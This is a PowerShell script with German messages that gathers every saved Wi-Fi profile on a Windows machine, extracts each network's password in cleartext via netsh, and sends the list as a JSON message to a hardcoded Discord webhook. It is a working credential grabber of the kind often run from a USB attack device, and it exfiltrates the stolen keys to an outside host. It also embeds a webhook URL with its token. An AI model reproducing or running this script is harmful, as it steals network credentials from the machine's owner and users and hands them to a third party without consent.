$profiles = netsh wlan show profiles | Select-String "Profil für alle Benutzer" | ForEach-Object {
    ($_ -split ":")[1].Trim()
}
Write-Host "Gefundene Profile: $($profiles -join ', ')"

$results = @()
foreach ($profile in $profiles) {
    $details = netsh wlan show profile name="$profile" key=clear
    $keyLine = $details | Select-String "Schlüsselinhalt"
    if ($keyLine) {
        $password = ($keyLine -split ":")[1].Trim()
    } else {
        $password = "<kein Passwort gefunden>"
    }
    $results += "$profile : $password"
}
$text = ($results -join "`n")
Write-Host "Text an Discord:`n$text"

$payload = @{
    "content" = "WLAN-Passwörter:`n$text"
} | ConvertTo-Json
$body = [System.Text.Encoding]::UTF8.GetBytes($payload)

try {
    Invoke-RestMethod -Uri "https://discord.com/api/webhooks/1377037403595739276/1bMWNUwWHnFiT-si9lhffTVM18sugLzq2Hz7NfEhmlmenMr36rgpu-y8wDLljLz08Zp3" -Method Post -ContentType "application/json" -Body $body
    Write-Host "Senden erfolgreich"
} catch {
    Write-Host "Fehler beim Senden: $_"
}
